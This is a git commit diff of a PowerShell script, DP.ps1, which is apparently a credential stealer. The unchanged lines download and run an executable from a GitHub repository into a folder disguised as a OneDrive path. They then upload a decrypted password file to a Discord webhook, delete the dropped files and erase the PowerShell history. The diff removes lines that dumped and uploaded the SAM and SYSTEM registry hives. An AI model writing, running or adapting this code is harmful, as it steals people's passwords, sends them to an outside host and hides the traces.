b79963e379b505f85d8f6ea01e8baaf679ed2eea
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-14 21:21:23 -0600

    Update DP.ps1

--- DP.ps1
+++ DP.ps1
@@ -1,6 +1,4 @@
 cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
-reg save HKLM\sam ./sam.save
-reg save HKLM\system ./system.save
 
 iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $Env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
 Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
@@ -28,12 +26,8 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv
-Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
-Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
 rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe" -r -Force -ErrorAction SilentlyContinue
-rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
-rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
